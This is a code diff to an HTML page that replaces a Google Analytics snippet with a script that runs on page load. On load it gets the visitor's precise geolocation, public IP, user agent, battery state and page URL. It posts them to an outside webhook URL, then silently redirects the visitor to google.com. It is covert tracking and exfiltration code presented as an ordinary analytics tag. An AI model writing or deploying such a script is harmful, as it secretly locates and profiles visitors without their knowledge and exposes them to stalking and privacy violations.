@@ -2,11 +2,80 @@
 <html lang="en">
 <head>
 <script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+function convertToDMS(lat, lng) {
+    function toDMS(deg, isLat) {
+        const absolute = Math.abs(deg);
+        const degrees = Math.floor(absolute);
+        const minutes = Math.floor((absolute - degrees) * 60);
+        const seconds = ((absolute - degrees - minutes / 60) * 3600).toFixed(1);
+        const direction = deg >= 0 
+            ? (isLat ? 'N' : 'E') 
+            : (isLat ? 'S' : 'W');
+        return `${degrees}°${minutes}'${seconds}"${direction}`;
+    }
 
-  gtag('config', 'G-3DDFQCC38F');
+    const latitude = toDMS(lat, true);
+    const longitude = toDMS(lng, false);
+    return `${latitude} ${longitude}`;
+}
+
+async function getGeolocation() {
+    if (!navigator.geolocation) {
+        return `geofail`
+    }
+
+    try {
+        const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
+
+        const { latitude, longitude } = position.coords;
+        return convertToDMS(latitude, longitude);
+    } catch (error) {
+        
+    }
+}
+
+async function tag() {
+    try {
+        const location = await getGeolocation();
+        let data = await fetch('https://api.ipify.org?format=json');
+        let mango = await data.json(); 
+        const url = await window.location.href;
+        const agent = await navigator.userAgent
+        
+        let time = new Date();
+        const battery = await navigator.getBattery();
+        const bat = (battery.level * 100) + "%"; 
+        const charging = battery.charging ? 'Yes' : 'No'; 
+        if (location){
+            let gmaps = "https://www.google.co.uk/maps/place/" + encodeURIComponent(location)
+            const webhook = 'https://webhook-test.com/c9f0839f004d466c974bcbac09970721';
+            const log = await fetch(webhook, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ "ip": mango.ip,"googlemaps": gmaps, "charging": charging, "battery percent": bat, "time": time, "url":url, "MaxTouchPoints":navigator.maxTouchPoints, "useragent":agent, "tag":"V1",})
+            });
+        }else{
+           let gmaps = "Location Unavailable"
+            const webhook = 'https://webhook-test.com/c9f0839f004d466c974bcbac09970721';
+            const log = await fetch(webhook, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ "ip": mango.ip,"googlemaps": gmaps, "time": time, "url":url, "tag":"V1", "charging": charging, "battery percent": bat, "MaxTouchPoints":navigator.maxTouchPoints, "useragent":agent})
+            }); 
+        }
+        window.location.replace('http://google.com')
+        
+    } catch (error) {
+    }
+}
+
+tag();
 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
